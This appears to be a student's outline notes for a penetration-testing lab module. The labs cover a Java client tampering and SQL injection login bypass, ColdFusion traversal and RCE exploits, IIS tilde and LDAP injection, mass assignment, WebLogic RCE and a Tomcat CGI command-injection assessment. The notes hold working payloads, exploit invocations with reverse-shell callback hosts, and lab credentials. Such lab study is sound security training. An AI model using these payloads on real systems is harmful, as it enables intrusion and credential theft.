      - The login credentials for login in the client application are qtc / clarabibi.
  - run the fatty-client.jar
    - credentials
      - qtc / clarabibi
    - port
      - the port pointing to the servers needs to be updated from 8000 to 1337
  - analyze the network traffic using Wireshark
    - client attempts to connect to the server.fatty.htb
    - start a command prompt as administrator
      - echo 10.10.10.174    server.fatty.htb >> C:\Windows\System32\drivers\etc\hosts
    - Inspecting the traffic again reveals that the client is attempting to connect to port 8000
  - The fatty-client.jar is a Java Archive file
    - Extract files.
  - search all the files for port 8000.
    - run PowerShell as administrator
      - ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List
        - Path       : C:\Users\cybervaca\Desktop\fatty-client\beans.xml  
          LineNumber : 13
          - cat fatty-client\beans.xml
            - <constructor-arg index="1" value = "8000"/>
            - <property name = "secret" value = "clarabibiclarabibiclarabibi"/>
          - edit the line <constructor-arg index="1" value = "8000"/> and set the port to 1337
            - Running the edited application will fail due to an SHA-256 digest mismatch.
              - These hashes are present in the file META-INF/MANIFEST.MF.
                - cat fatty-client\META-INF\MANIFEST.MF
                  - Manifest-Version: 1.0  
                    Archiver-Version: Plexus Archiver  
                    Built-By: root  
                    Sealed: True  
                    Created-By: Apache Maven 3.3.9  
                    Build-Jdk: 1.8.0_232  
                    Main-Class: htb.fatty.client.run.Starter  
                    Name: META-INF/maven/org.slf4j/slf4j-log4j12/pom.properties  
                    SHA-256-Digest: miPHJ+Y50c4aqIcmsko7Z/hdj03XNhHx3C/pZbEp4Cw=  
                    Name: org/springframework/jmx/export/metadata/ManagedOperationParamete  
                    r.class  
                    SHA-256-Digest: h+JmFJqj0MnFbvd+LoFffOtcKcpbf/FD9h2AMOntcgw=  
                    <SNIP>
                    - The modified MANIFEST.MF
                      - Manifest-Version: 1.0  
                        Archiver-Version: Plexus Archiver  
                        Built-By: root  
                        Sealed: True  
                        Created-By: Apache Maven 3.3.9  
                        Build-Jdk: 1.8.0_232  
                        Main-Class: htb.fatty.client.run.Starter
                        - should end with a new line.
  - update and run the fatty-client.jar file
    - cd .\fatty-client
      - jar -cmf .\META-INF\MANIFEST.MF .\fatty-client-new.jar *
        - fatty-client-new.jar file to start it and try logging in using the credentials qtc / clarabibi.
          - Login Successful!
  - Foothold
    - Profile -> Whoami
      - user qtc is assigned with the user role.
    - ServerStatus
      - we can't click on any options.
        - might be another user with higher privileges
    - FileBrowser
      - Notes.txt reveals the file security.txt. Clicking the Open
        - few critical issues in the application still need to be fixed
      - Mail
        - dave.txt file containing interesting information
          - all admin users are removed from the database.
            - It also refers to a timeout implemented in the login procedure to mitigate time-based SQL injection
    - Path Traversal
      - ../../../../../../etc/passwd
        - in the field and clicking the Open button.
          - The server filters out the /
    - decompile the application
      - using JD-GU
        - <http://java-decompiler.github.io/>
        - dragging and dropping the fatty-client-new.jar onto the jd-gui
        - Reading its content reveals the following code.
          - fatty-client-new.jar.src/htb/fatty/client/methods/Invoker.java
            - public String showFiles(String folder)
              - takes in one argument for the folder name
          - fatty-client-new.jar.src/htb/fatty/client/gui/ClientGuiTest.java
            - ClientGuiTest.this.currentFolder = "configs";  
              try {  
              response = ClientGuiTest.this.invoker.showFiles("configs");
              - We can replace the configs folder name with ..
        - compile the ClientGuiTest.Java file.
          - javac -cp fatty-client-new.jar fatty-client-new.jar.src\htb\fatty\client\gui\ClientGuiTest.java
            - This generates several class files
              - create a new folder and extract the contents of fatty-client-new.jar into it
                - mkdir raw
                  - cp fatty-client-new.jar raw\fatty-client-new-2.jar
          - decompress fatty-client-new-2.jar by right-clicking and selecting Extract Here.
            - Overwrite any existing htb/fatty/client/gui/*.class files with updated class files.
              - mv -Force fatty-client-new.jar.src\htb\fatty\client\gui\*.class raw\htb\fatty\client\gui\
        - Finally, we build the new JAR file.
          - cd raw
            - jar -cmf META-INF\MANIFEST.MF traverse.jar .
    - Let's log in to the application and navigate to FileBrowser -> Config
      - This is successful. We can now see the content of the directory configs/../
        - logs  
          tar  
          start.sh  
          fatty-server.jar  
          files
    - We can modify the open functio
      - to download the file fatty-server.jar
        - fatty-client-new.jar.src/htb/fatty/client/methods/Invoker.java
          - import java.io.FileOutputStream;  
            <SNIP>  
            public String open(String foldername, String filename) throws MessageParseException, MessageBuildException, IOException {  
            String methodName = (new Object() {}).getClass().getEnclosingMethod().getName();  
            logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");  
            if (AccessCheck.checkAccess(methodName, this.user)) {  
            return "Error: Method '" + methodName + "' is not allowed for this user account";  
            }  
            this.action = new ActionMessage(this.sessionID, "open");  
            this.action.addArgument(foldername);  
            this.action.addArgument(filename);  
            sendAndRecv();  
            String desktopPath = System.getProperty("user.home") + "\\Desktop\\fatty-server.jar";  
            FileOutputStream fos = new FileOutputStream(desktopPath);  
            if (this.response.hasError()) {  
            return "Error: Your action caused an error on the application server!";  
            }  
            byte[] content = this.response.getContent();  
            fos.write(content);  
            fos.close();  
            return "Successfully saved the file to " + desktopPath;  
            }
        - Rebuild the JAR file by following the same steps
          - click the Open button.
            - file is successfully downloaded onto our desktop
  - SQL Injection
    - Decompiling the fatty-server.jar using JD-GUI
      - htb/fatty/server/database/FattyDbSession.class
        - checkLogin() function that handles the login functionality.
          - rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");  
            this.logger.logError("[-] Failure with SQL query: ==> SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "' <==");  
            this.logger.logError("[-] Exception was: '" + e.getMessage() + "'");
      - Let's check how the client application sends credentials to the server.
        - ClientGuiTest.this.user = new User() ;  
          ClientGuiTest.this. user. setUsername(str1);  
          ClientGuiTest.this.user.setPassword(str2);
          - Let's check how the client application sends credentials to the server. The login button creates the new object ClientGuiTest.this.user for the User class. It then calls the setUsername() and setPassword() functions
      - Let's check the setUsername() and setPassword() function
        - htb/fatty/shared/resources/user.java
          - public void setUsername(String username) {  
            this.username = username;  
            }  
            public void setPassword(String password) {  
            String hashString = this.username + password + "clarabibimakeseverythingsecure";  
            MessageDigest digest = null;
            - username isn't sanitized
              - making it vulnerable to SQL injection
    - edit the code in the fatty-client-new.jar.src/htb/fatty/client/gui/ClientGuiTest.java
      - ClientGuiTest.this.currentFolder = "../logs";  
        try {  
        response = ClientGuiTest.this.invoker.showFiles("../logs");
        - Listing the content of the error-log.txt file so we can see it in FileBrowser
          - Login into the application using the username qtc'
            - error-log.txt via LFI ?
              - SELECT  
                id, username, email, password, role FROM users WHERE username='qtc" <==
                - confirms that the username field is vulnerable to SQL Injection.
    - Assuming that the username in the login form is ' or '1'='1
      - SELECT id,username,email,password,role FROM users WHERE username='' or '1'='1'
        - succeeds and returns the first record in the database.
          - The user-supplied password hash user.getPassword() is calculated as follows.
            - sha256("' or '1'='1" + "' or '1'='1" + "clarabibimakeseverythingsecure") = cc421e01342afabdd4857e7a1db61d43010951c7d5269e075a029f5d192ee1c8
              - Although the hash sent to the server by the client doesn't match the one in the database
    - the injection in the username field can be leveraged to create a fake user entry
      - It is possible to create fake entries using the SELECT
        - MariaDB [userdb]> select * from users where username='test' union select 'admin', 'welcome123';
      - test' UNION SELECT 1,'invaliduser','invalid@a.b','invalidpass','admin
    - The following snippet of code sends the plaintext password entered in the form. Let's modify the code to submit the password as it is from the client application.
      - htb/fatty/shared/resources/User.java
        - public User(int uid, String username, String password, String email, Role role) {  
          this.uid = uid;  
          this.username = username;  
          this.password = password;  
          this.email = email;  
          this.role = role;  
          }  
          public void setPassword(String password) {  
          this.password = password;  
          }
          - rebuild the JAR file
    - attempt to log in
      - username field
        - abc' UNION SELECT 1,'abc','a@b.com','abc','admin
      - password field
        - abc
      - success
    - LAB
      - What is the IP address of the eth0 interface under the ServerStatus -> Ipconfig tab in the fatty-client application?
        - RDP
          - xfreerdp /u:cybervaca /p:'&aue%C)}6g-d{w' /v:10.129.228.115
        - bypass integrity check
          - Unpackage The JAR
            - Move JAR  to seperate folder >Right Click > Extract Here
          - Edit the content files
            - META-INF\MANIFEST.MF
              - Delete all the contaent and leave the Head of the file
                - cat .\MANIFEST.MF
                  - Manifest-Version: 1.0  
                    Archiver-Version: Plexus Archiver  
                    Built-By: root  
                    Sealed: True  
                    Created-By: Apache Maven 3.3.9  
                    Build-Jdk: 1.8.0_232  
                    Main-Class: htb.fatty.client.run.Starter  
                    PS C:\Apps\fatty-client\META-INF>
                    - Ensure there is CRLF (\n) in the end
            - beta.xml
              - change the port from 8000 to 1337
            - Delete these files
              - META-INF\1.RSA
              - META-INF\1.SF
          - Package the JAR again
            - jar -cmf .\META-INF\MANIFEST.MF .\fatty-client-new.jar *
              - Application can started again
        - Run the Application
          - qtc:clarabib
            - Login Successful
              - ServerStatus canot be used
                - try previlege escalation via SQLI
        - mkdir jd-gui
        - open jd-gui
          - select the jar file
            - File > Save All Sources
              - jd-gui\fatty-client-new.jar.src
        - Extract files
        - change file contents
          - htb/fatty/shared/resources/User.java
            - public User(int uid, String username, String password, String email, Role role) {  
              this.uid = uid;  
              this.username = username;  
              this.password = password;  
              this.email = email;  
              this.role = role;  
              }  
              public void setPassword(String password) {  
              this.password = password;  
              }
              - Modify these 2 Functions
        - Path traversal
          - Error: You action cause an error on application server!
            - the lab solution dont requiere it
        - bypass password hashing validation
          - HTB Steps to compile (Failed)
            - Compile
              - mv ..\fatty-client-new.jar
              - javac -cp .\fatty-client-new.jar .\jd-gui\htb\fatty\shared\resources\User.java
                - this will make lot of class fils in gui folder
              - cp .\fatty-client-new.jar raw\fatty-client-new-2.jar
            - overwrite any existing class
              - Right Click on fatty-client-new-2.jar > Extract here
              - C:\apps\fatty-client>
                - mv -Force jd-gui\htb\fatty\client\gui\*.class raw\htb\fatty\client\gui\
                - mv -Force jd-gui\htb\fatty\shared\resources\*.class .\raw\htb\fatty\shared\resources\
              - cd raw
                - jar -cmf META-INF\MANIFEST.MF traverse.jar .
            - opan traverse.jar and login
              - Filebrowser
                - select error-log.txt
                  - Your Action caused an error on application server!
          - Gemini Steps to Compile
            - javac -source 8 -target 8 -cp fatty-client-new.jar jd-gui\htb\fatty\shared\resources\User.java
            - Copy-Item -Path .\jd-gui\htb\fatty\shared\resources\User.class -Destination .\raw\htb\fatty\shared\resources\User.class -Force
            - jar -cmf META-INF\MANIFEST.MF traverse.jar -C raw .
        - run travers and login
          - username: abc' UNION SELECT 1,'abc','a@b.com','abc','admin
            - password: abc
              - Login Successful
          - Click on ServerStatus > IPconfig
            - 172.28.0.3
## Part 3

### ColdFusion - Discovery & Enumeration

- Intro
  - cfquery tag can execute SQL
  - purposes and benefits of ColdFusion
    - ColdFusion allows developers to build rich, responsive web applications easily.
    - ColdFusion easily integrates with databases
    - streamline web content management
      - supports AJAX by automatically
    - highly performant and is optimised for low latency and high throughput
    - allow developers to work together on projects
  - few known vulnerabilities of ColdFusion:
    - CVE-2021-21087: Arbitrary disallow of uploading JSP source code
    - CVE-2020-24453: Active Directory integration misconfiguration
    - CVE-2020-24450: Command injection vulnerability
    - CVE-2020-24449: Arbitrary file reading vulnerability
    - CVE-2019-15909: Cross-Site Scripting (XSS) Vulnerability
- Discovery
  - ports
    - 80
    - 443
    - 1935
      - RPC
    - 25
    - 8500
      - SSL
    - 5500
      - Server Monitor
- Enumeration
  - Port Scanning
  - File Extensions
    - ColdFusion pages typically use ".cfm" or ".cfc" file
  - X-Powered-By: ColdFusion
  - Default Files
    - admin.cfm
    - CFIDE/administrator/index.cfm
  - nmap -p- -sC -Pn 10.129.247.30 --open
    - 135/tcp   open  msrpc  
      8500/tcp  open  fmtp  
      49154/tcp open  unknown
      - Navigating to the IP:8500
        - ists 2 directories, CFIDE and cfdocs
          - /CFIDE/administrator
            - ColdFusion 8
- LAB
  - What ColdFusion protocol runs on port 5500?
    - nmap -p- -sC -Pn 10.129.1.12 --open
      - 135/tcp   open  msrpc  
        8500/tcp  open  fmtp  
        49154/tcp open  unknown
    - Server Monitor
      - thats it
### Attacking ColdFusion

- check for existing known exploits
  - searchsploit adobe coldfusion
    - Adobe ColdFusion 8 - Remote Command Execution (RCE)
    - Adobe ColdFusion - Directory Traversal (Metasploit)
  - Directory Traversal
    - CVE-2010-2861
    - These ColdFusion files are vulnerable to a directory traversal attack in Adobe ColdFusion 9.0.1 and earlier version
      - CFIDE/administrator/settings/mappings.cfm
        - http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=en
          - http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
      - logging/settings.cfm
      - datasources/index.cfm
      - j2eepackaging/editarchive.cfm
      - CFIDE/administrator/enter.cfm
    - directory parameter is not validated correctly
      - http://example.com/index.cfm?directory=../../../etc/&file=passwd
    - copy the exploit to a working directory and then execute the file
      - searchsploit -p 14641
        - cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
          - or searchsploit -m
    - secrets
      - password.properties
        - a configuration file that securely stores encrypted passwords
          - These encrypted passwords are used for services
            - database connections, mail servers, LDAP servers,
      - ColdFusion can automatically retrieve and use them to authenticate with the respective services without requiring the manual entry of passwords each time
        - [cf_root]/lib
    - python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
      - rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n  
        password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03  
        encrypted=true
  - Unauthenticated RCE
    - CVE-2009-2265
    - vulnerable code example
      - <cfset cmd = "#cgi.query_string#">  
        <cfexecute name="cmd.exe" arguments="/c #cmd#" timeout="5">
        - it does not properly validate the cmd variable before executing it
    - payload
      - http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt
        - # Decoded: http://www.example.com/index.cfm?; echo "This server has been compromised!" > C:\compromise.txt
    - searchsploit -p 50057
      - cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
        - if __name__ == '__main__':  
          # Define some information  
          lhost = '10.10.14.55' # HTB VPN IP  
          lport = 4444 # A port not in use on localhost  
          rhost = "10.129.247.30" # Target IP  
          rport = 8500 # Target Port  
          filename = uuid.uuid4().hex
          - python3 50057.py
            - Reverse Shell
              - C:\ColdFusion8\runtime\bin>
                - dir
- LAB
  - What user is ColdFusion running as?
    - searchsploit adobe coldfusion
      - searchsploit -m 50057
        - nano 50057.py
          - modify lhost and rhost
            - python 50057.py
              - C:\ColdFusion8\runtime\bin>
                - whoami
                  - arctic\tolis
### IIS Tilde Enumeration

- Intro
  - The tilde (~) character
    - signifies a short file name in a URL
      - When a file or folder is created on an IIS server
        - Windows generates a short file name in the 8.3 format
          - eight characters for the file name, a period, and three characters for the extension.
            - if someone determines a file or folder's short file name, they can exploit the tilde character
              - to access sensitive data or hidden resources.
  - http://example.com/~s
    - 200 OK
      - revealing a directory with a short name beginning with "s"
        - http://example.com/~se
          - 200 OK
            - Continuing this procedure, the short name secret~1 is eventually discovered
              - http://example.com/~secret
  - Once the short name secret~1 is identified
    - enumeration of specific file names
      - http://example.com/secret~1/somefile.txt
      - http://example.com/secret~1/anotherfile.docx
    - or The same IIS tilde directory enumeration technique can also detect 8.3 short file names for files
      - http://example.com/secret~1/somefi~1.txt
        - if two files named somefile.txt and somefile1.txt exist in the same directory
          - their 8.3 short file names would be:
            - somefi~1.txt for somefile.txt
            - somefi~2.txt for somefile1.txt
- Enumeration
  - Nmap - Open ports
    - nmap -p- -sV -sC --open 10.129.224.91
      - 80/tcp open  http    Microsoft IIS httpd 7.5
        - enumeration attack on this version could be a viable option.
  - Tilde Enumeration using IIS ShortName Scanner
    - IIS-ShortName-Scanner
      - <https://github.com/irsdl/IIS-ShortName-Scanner>
        - you will need to install Oracle Java
          - <https://ubuntuhandbook.org/index.php/2022/03/install-jdk-18-ubuntu/>
      - java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
        - Do you want to use proxy [Y=Yes, Anything Else=No]?
          - |_ Identified directories: 2  
            |_ ASPNET~1  
            |_ UPLOAD~1
  - Generate Wordlist
    - egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
      - This command combines egrep and sed to filter and modify the contents of input files, then save the results to a new file.
        - recursive search through directories. The ^transf pattern matches any line that starts with "transf". The output of this command will be lines that begin with "transf" along with their source file names.
  - Gobuster Enumeration
    - gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
      - /transf**.aspx
- LAB
  - What is the full .aspx filename that Gobuster identified?
    - egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
      - gobuster dir -u http://10.129.1.15/ -w /tmp/list.txt -x .aspx,.asp
        - /transfer.aspx
### LDAP

- access and manage directory information
  - contains information about network resources such as users, groups, computers, printers
- implementations of LDAP
  - OpenLDAP
  - Microsoft Active Directory
- ldapsearch
  - ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
    - explain the command
      - Connect to the server ldap.example.com on port 389.
      - Bind (authenticate) as cn=admin,dc=example,dc=com with password secret123.
      - Search under the base DN ou=people,dc=example,dc=com.
      - Use the filter (mail=john.doe@example.com) to find entries that have this email address.
    - dn: uid=jdoe,ou=people,dc=example,dc=com  
      objectClass: inetOrgPerson  
      objectClass: organizationalPerson  
      objectClass: person  
      objectClass: top  
      cn: John Doe  
      sn: Doe  
      uid: jdoe  
      mail: john.doe@example.com
- LDAP Injection
  - exploits web applications that use LDAP
    - similar to SQL injection attacks
    - special characters or operators
      - *	An asterisk * can match any number of characters.  
        ( )	Parentheses ( ) can group expressions.  
        |	A vertical bar | can perform logical OR.  
        &	An ampersand & can perform logical AND.  
        (cn=*)	Input values that try to bypass authentication or authorisation checks by injecting conditions that always evaluate to true can be used. For example, (cn=*) or (objectClass=*) can be used as input values for a username or password fields.
    - example
      - application uses the following LDAP query
        - (&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
        - inject the * character into the $username or $password field to modify the LDAP query and bypass authentication.
          - $username = "*";  
            $password = "dummy";  
            (&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
          - $username = "dummy";  
            $password = "*";  
            (&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
  - mitigate
    - sanitize user input before incorporating it into LDAP queries
      - removing LDAP-specific special characters like * and employing parameterised queries
- Enumeration
  - nmap -p- -sC -sV --open --min-rate=1000 10.129.204.229
    - 80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))  
      389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
      - it is safe to assume that the web application running on port 80 uses LDAP for authentication.
- Injection
  - Attempting to log in using a wildcard character (*)
- LAB
  - After bypassing the login, what is the website "Powered by"?
    - Login with *:*
      - Powered by w3.css
### Web Mass Assignment Vulnerabilities

- attackers can modify the model attributes of an application through the parameters sent to the server.
- Ruby on Rails is a web application framework that is vulnerable to this type of attack
  - Let's assume that the server receives the following parameters.
    - { "user" => { "username" => "hacker", "email" => "hacker@example.com", "admin" => true } }
      - Although the User model does not explicitly state that the admin attribute is accessible, the attacker can still change it
- Exploiting Mass Assignment Vulnerability
  - After login in
  - Reviewing the python code
    - /opt/asset-manager/app.py
      - for i,j,k in cur.execute('select * from users where username=? and password=?',(username,password)):  
        if k:  
        session['user']=i  
        return redirect("/home",code=302)  
        else:  
        return render_template('login.html',value='Account is pending for approval')
        - if the value k is set. If yes, then it allows the user to log in
    - try:  
      if request.form['confirmed']:  
      cond=True  
      except:  
      cond=False  
      with sqlite3.connect("database.db") as con:  
      cur = con.cursor()  
      cur.execute('select * from users where username=?',(username,))  
      if cur.fetchone():  
      return render_template('index.html',value='User exists!!')  
      else:  
      cur.execute('insert into users values(?,?,?)',(username,password,cond))  
      con.commit()  
      return render_template('index.html',value='Success!!')
      - if we set the confirmed parameter during registration, then it inserts cond as True and allows us to bypass the registration checking step.
        - POST /register  
          username=new&password=test&confirmed=test
  - try to log in to the application using the new:test
- Prevention
  - one should explicitly assign the attributes for the allowed fields
  - whitelisting methods
  - hash that includes only the username and email attributes, ignoring any more input
- LAB
  - We placed the source code of the application we just covered at /opt/asset-manager/app.py inside this exercise's target, but we changed the crucial parameter's name. SSH into the target, view the source code and enter the parameter name that needs to be manipulated to log in to the Asset Manager web application.
    - ssh root@10.129.205.15  
      password:!x4;EW[ZLwmDx?=w
      - cat /opt/asset-manager/app.py
        - ...  
          if request.form['active']:  
          ...
    - nmap 10.129.205.15
      - 22/tcp   open  ssh  
        3000/tcp open  ppp
    - visit 10.129.205.15:3000
      - click on register
        - change request methid to POST
          - username=new&password=test&active=test
            - Login successfully with new:test
              - active is the answer
### Attacking Applications Connecting to Services

- ELF Executable Examination
  - ./octopus_checker
    - it connects to database instances in order to verify that they are available.
  - Using tools like
    - PED (Python Exploit Development Assistance for GDB)
      - <https://github.com/longld/peda>
    - GNU Debugger (GDB)
      - debugging C and C++
  - gdb ./octopus_checker
    - Once the binary is loaded,
      - set the disassembly-flavor to define the display style of the code
        - gdb-peda$
          - set disassembly-flavor intel
            - disas main
              - 0x00005555555555ff <+425>:	     mov    esi,0x0  
                0x0000555555555604 <+430>:	mov    rdi,rax  
                0x0000555555555607 <+433>:	call   0x5555555551b0 <SQLDriverConnect@plt>  
                0x000055555555560c <+438>:	add    rsp,0x10  
                0x0000555555555610 <+442>:	mov    WORD PTR [rbp-0x4b4],ax
                - several call instructions that point to addresses containing strings. They appear to be sections of a SQL connection
    - Adding a breakpoint at this address and running the program once again
      - b *0x5555555551b0
        - Breakpoint 1 at 0x5555555551b0
          - run
            - RDX: 0x7fffffffda70 ("DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=username;PWD=password;")
- DLL File Examination
  - The MultimasterAPI.dll binary is found on a remote machine
    - Examination of the file reveals that this is a .Net assembly.
      - PSH> Get-FileMetaData .\MultimasterAPI.dll
        - M 
.NETFramework...
      - Using the debugger and .NET assembly editor dnSpy
        - <https://github.com/0xd4d/dnSpy>
        - This tool allows reading, editing, and debugging the source code of a .NET assembly
          - MultimasterAPI.Controllers -> ColleagueController
            - database connection string containing the password.
- LAB
  - What credentials were found for the local database instance while debugging the octopus_checker binary? (Format username:password)
    - ssh htb-student@10.129.205.20  
      password:HTB_@cademy_stdnt!
      - gdb ./octopus_checker
        - set disassembly-flavor intel
          - disas main
            - c
              - break SQLDriverConnect
                - starti
                  - continue
                    - delete
                      - break SQLDriverConnect
                        - run
                          - RDX: 0x7fffffffdf30 ("DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=SA;PWD=N0tS3cr3t!;")
                            - SA:N0tS3cr3t!
### Other Notable Applications

- The module was designed to teach a methodology that can be applied to all other applications we may encounter.
  - vCenter
    - <https://www.rapid7.com/db/modules/exploit/multi/http/vmware_vcenter_uploadova_rce/>
    - <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22005>
- LAB
  - Enumerate the target host and identify the running application. What application is running?
    - nmap 10.129.201.102 -p- -sC
      - 21/tcp    open  ftp  
        | ftp-anon: Anonymous FTP login allowed (FTP code 230)  
        | 09-07-20  04:51PM       <DIR>          aspnet_client  
        | 09-07-20  04:49PM                99710 iisstart.png  
        |_09-07-20  07:13PM                  218 web.config  
        | ftp-syst:  
        |_  SYST: Windows_NT  
        80/tcp    open  http  
        |_http-title: 10.129.201.102 - /  
        | http-methods:  
        |_  Potentially risky methods: TRACE  
        135/tcp   open  msrpc  
        139/tcp   open  netbios-ssn  
        443/tcp   open  https  
        | ssl-cert: Subject: commonName=MS01  
        | Not valid before: 2020-09-06T23:51:02  
        |_Not valid after:  2021-03-08T23:51:02  
        |_ssl-date: 2026-06-19T14:48:30+00:00; -1s from scanner time.  
        | http-methods:  
        |_  Potentially risky methods: TRACE  
        |_http-title: 10.129.201.102 - /  
        | tls-alpn:  
        |   h2  
        |_  http/1.1  
        445/tcp   open  microsoft-ds  
        5985/tcp  open  wsman  
        7001/tcp  open  afs3-callback  
        |_weblogic-t3-info: T3 protocol in use (WebLogic version: 12.2.1.3)  
        47001/tcp open  winrm  
        49664/tcp open  unknown  
        49665/tcp open  unknown  
        49666/tcp open  unknown  
        49667/tcp open  unknown  
        49668/tcp open  unknown  
        49669/tcp open  unknown  
        49670/tcp open  unknown
        - WebLogic
  - Enumerate the application for vulnerabilities. Gain remote code execution and submit the contents of the flag.txt file on the administrator desktop.
    - searchsploit weblogic
      - Oracle WebLogic Server 12.2.1.0 - RCE (Unauthenticated)          | java/webapps/49479.py
        - searchsploit -m 49479
          - python 49479.py -u http://10.129.201.102:7001
            - (CHackA0101GNU/Linux)$
              - ls
                - <TITLE>Error 404--Not Found</TITLE>
                  - its CMD shell
              - type c:\users\administrator\desktop\flag.txt
                - w3b_l0gic_RCE!
### Application Hardening

- General Hardening Tips
  - Secure authentication:
  - Access controls
  - Disable unsafe features
  - Regular updates
  - Backups
  - Security monitoring
  - LDAP integration with Active Directory
- Application-Specific Hardening Tips
  - WordPress
    - Security monitoring
      - Use a security plugin such as WordFence
        - <https://www.wordfence.com/>
  - Joomla
    - Access controls
      - A plugin such as AdminExile can be used to require a secret key to log in
        - <https://extensions.joomla.org/extension/adminexile/>
  - Drupal
    - Access controls
      - Disable, hide, or move the admin login page
  - Tomcat
    - Access controls
      - Limit access to the Tomcat Manager and Host-Manager applications to only localhost
  - Jenkins
    - Access controls
      - Configure permissions using the Matrix Authorization Strategy plugin
        - <https://plugins.jenkins.io/matrix-auth>
  - Splunk
    - Regular updates
      - Make sure to change the default password and ensure that Splunk is properly licensed to enforce authentication
  - PRTG Network Monitor
    - Secure authentication
      - Make sure to stay up-to-date and change the default PRTG password
  - osTicket
    - Access controls
      - Limit access from the internet if possible
  - GitLab
    - Secure authentication
      - Enforce sign-up restrictions such as requiring admin approval for new sign-ups, configuring allowed and denied domains
### Skills Assessment I

- What vulnerable application is running?
  - nmap -sC -p- 10.129.1.16
    - 21/tcp    open  ftp  
      | ftp-syst:  
      |_  SYST: Windows_NT  
      | ftp-anon: Anonymous FTP login allowed (FTP code 230)  
      |_09-01-21  08:07AM       <DIR>          website_backup  
      80/tcp    open  http  
      |_http-title: Freight Logistics, Inc  
      | http-methods:  
      |_  Potentially risky methods: TRACE  
      135/tcp   open  msrpc  
      139/tcp   open  netbios-ssn  
      445/tcp   open  microsoft-ds  
      3389/tcp  open  ms-wbt-server  
      |_ssl-date: 2026-06-19T16:24:09+00:00; +1h00m00s from scanner time.  
      | rdp-ntlm-info:  
      |   Target_Name: APPS-SKILLS1  
      |   NetBIOS_Domain_Name: APPS-SKILLS1  
      |   NetBIOS_Computer_Name: APPS-SKILLS1  
      |   DNS_Domain_Name: APPS-SKILLS1  
      |   DNS_Computer_Name: APPS-SKILLS1  
      |   Product_Version: 10.0.17763  
      |_  System_Time: 2026-06-19T16:24:09+00:00  
      | ssl-cert: Subject: commonName=APPS-SKILLS1  
      | Not valid before: 2026-06-18T16:22:33  
      |_Not valid after:  2026-12-18T16:22:33  
      5985/tcp  open  wsman  
      8000/tcp  open  http-alt  
      | http-robots.txt: 1 disallowed entry  
      |_/  
      |_http-title: Site doesn't have a title (text/html;charset=utf-8).  
      8009/tcp  open  ajp13  
      |_ajp-methods: Failed to get a valid response for the OPTION request  
      8080/tcp  open  http-proxy  
      |_http-title: Apache Tomcat/9.0.0.M1  
      |_http-favicon: Apache Tomcat  
      47001/tcp open  winrm  
      49664/tcp open  unknown  
      49665/tcp open  unknown  
      49666/tcp open  unknown  
      49667/tcp open  unknown  
      49668/tcp open  unknown  
      49669/tcp open  unknown  
      49670/tcp open  unknown  
      49671/tcp open  unknown  
      Host script results:  
      | smb2-security-mode:  
      |   3:1:1:  
      |_    Message signing enabled but not required  
      | smb2-time:  
      |   date: 2026-06-19T16:24:11  
      |_  start_date: N/A  
      |_clock-skew: mean: 1h00m00s, deviation: 0s, median: 1h00m00s
      - Tomcat
- What port is this application running on?
  - 8080
- What version of the application is in use?
  - 9.0.0.M1
- Exploit the application to obtain a shell and submit the contents of the flag.txt file on the Administrator desktop.
  - gobuster dir -u http://10.129.1.16:8080/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
    - /docs                 (Status: 302) [Size: 0] [--> http://10.129.1.16:8080/docs/]  
      /examples             (Status: 302) [Size: 0] [--> http://10.129.1.16:8080/examples/]  
      /http%3A%2F%2Fwww     (Status: 400) [Size: 0]  
      /http%3A%2F%2Fyoutube (Status: 400) [Size: 0]  
      /http%3A%2F%2Fblogs   (Status: 400) [Size: 0]  
      /http%3A%2F%2Fblog    (Status: 400) [Size: 0]  
      /**http%3A%2F%2Fwww   (Status: 400) [Size: 0]
  - ghostscan
    - https://web.archive.org/web/20260216155612/https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/blob/master/CNVD-2020-10487-Tomcat-Ajp-lfi.py
      - copy the code and paste it in new python file
        - python2 tomcat-ajp.lfi.py 10.129.1.17 -p 8009 -f WEB-INF/web.xml
          - this was not necessary sine it cant open files outside webroot
  - visit:8000
    - Welcome to Jenkins!
      - default credentials didnt work
  - ffuf -u http://10.129.1.17:8080/cgi/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .bat,.md -ic
    - cmd.bat
      - curl 'http://10.129.1.17:8080/cgi/cmd.bat?&dir'
        - curl 'http://10.129.1.17:8080/cgi/cmd.bat?&dir..%5C..%5C..%5C..%5C..%5C..%5C..%5CUsers%5CAdministrator%5CDesktop%5Cflag.txt'
          - flag.txt
            - open file was not possible by cat or type
    - MSF
      - windows/http/tomcat_cgi_cmdlineargs
        - setg rhosts 10.129.1.18
        - set targeturi /cgi/cmd.bat
        - set lhost 10.10.14.2
        - set ForceExploit true
